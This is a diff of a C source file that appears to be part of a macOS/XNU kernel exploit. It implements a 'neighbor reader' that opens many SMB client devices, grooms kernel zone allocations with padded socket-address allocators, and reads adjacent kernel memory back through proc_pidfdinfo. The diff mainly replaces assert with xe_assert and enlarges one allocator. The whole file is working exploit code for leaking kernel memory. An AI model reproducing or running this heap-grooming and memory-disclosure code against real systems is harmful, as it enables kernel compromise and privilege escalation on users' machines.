@@ -18,6 +18,7 @@
 #include "zkext_neighbor_reader.h"
 #include "platform_constants.h"
 #include "util_log.h"
+#include "util_assert.h"
 
 #include "../xnu/saddr_allocator.h"
 #include "../smb/client.h"
@@ -38,22 +39,22 @@ struct kmem_zkext_neighbor_reader {
 };
 
 void kmem_neighbor_reader_init_saddr_allocators(kmem_zkext_neighour_reader_t reader) {
-    assert(reader->reader_allocator == NULL);
-    assert(reader->pad_end_allocator == NULL);
-    reader->pad_start_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 8);
+    xe_assert(reader->reader_allocator == NULL);
+    xe_assert(reader->pad_end_allocator == NULL);
+    reader->pad_start_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 32);
     reader->reader_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 32);
     reader->pad_end_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64);
 }
 
 kmem_zkext_neighour_reader_t kmem_neighbor_reader_create(void) {
     int fd_smb = smb_client_open_dev();
-    assert(fd_smb >= 0);
+    xe_assert(fd_smb >= 0);
     kmem_zkext_neighour_reader_t reader = malloc(sizeof(struct kmem_zkext_neighbor_reader));
     bzero(reader, sizeof(struct kmem_zkext_neighbor_reader));
     
     dispatch_apply(SMB_FD_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
         reader->fds_smb[index] = smb_client_open_dev();
-        assert(reader->fds_smb[index] >= 0);
+        xe_assert(reader->fds_smb[index] >= 0);
     });
     
     kmem_neighbor_reader_init_saddr_allocators(reader);
@@ -62,8 +63,8 @@ kmem_zkext_neighour_reader_t kmem_neighbor_reader_create(void) {
 }
 
 void kmem_zkext_neighbor_reader_prepare(kmem_zkext_neighour_reader_t reader, char* data, size_t data_size) {
-    assert(data_size <= UINT32_MAX);
-    assert(reader->state == STATE_CREATED);
+    xe_assert(data_size <= UINT32_MAX);
+    xe_assert(reader->state == STATE_CREATED);
     xnu_saddr_allocator_allocate(reader->pad_start_allocator);
     xnu_saddr_allocator_allocate(reader->reader_allocator);
     xnu_saddr_allocator_fragment(reader->reader_allocator, XE_PAGE_SIZE / 64 / 8);
@@ -85,7 +86,7 @@ void kmem_zkext_neighbor_reader_attempt_cleanup(kmem_zkext_neighour_reader_t rea
 }
 
 int kmem_zkext_neighbor_reader_read_modified(kmem_zkext_neighour_reader_t reader, struct socket_fdinfo* infos, size_t* count) {
-    assert(reader->state == STATE_PREPARED);
+    xe_assert(reader->state == STATE_PREPARED);
     
     int fds_modified[*count];
     bzero(fds_modified, sizeof(fds_modified));
@@ -98,7 +99,7 @@ int kmem_zkext_neighbor_reader_read_modified(kmem_zkext_neighour_reader_t reader
     for (int i=0; i<num_modified_actual; i++) {
         int fd = fds_modified[i];
         int read = proc_pidfdinfo(getpid(), fd, PROC_PIDFDSOCKETINFO, &infos[i], sizeof(struct socket_fdinfo));
-        assert(read == sizeof(struct socket_fdinfo));
+        xe_assert(read == sizeof(struct socket_fdinfo));
     }
     
     *count = num_modified_actual;
@@ -106,9 +107,9 @@ int kmem_zkext_neighbor_reader_read_modified(kmem_zkext_neighour_reader_t reader
 }
 
 int kmem_zkext_neighbor_reader_prepare_read_modified(kmem_zkext_neighour_reader_t reader, char* out, uint8_t size) {
-    assert(reader->state == STATE_CREATED);
-    assert(size < 128);
-    assert(size >= 64);
+    xe_assert(reader->state == STATE_CREATED);
+    xe_assert(size < 128);
+    xe_assert(size >= 64);
     
     struct sockaddr_un addr;
     bzero(&addr, sizeof(addr));
@@ -143,7 +144,7 @@ int kmem_zkext_neighbor_reader_prepare_read_modified(kmem_zkext_neighour_reader_
 }
 
 void kmem_zkext_neighbor_reader_reset(kmem_zkext_neighour_reader_t reader) {
-    assert(reader->state == STATE_PREPARED);
+    xe_assert(reader->state == STATE_PREPARED);
     xnu_saddr_allocator_destroy(&reader->pad_start_allocator);
     xnu_saddr_allocator_destroy(&reader->reader_allocator);
     xnu_saddr_allocator_destroy(&reader->pad_end_allocator);
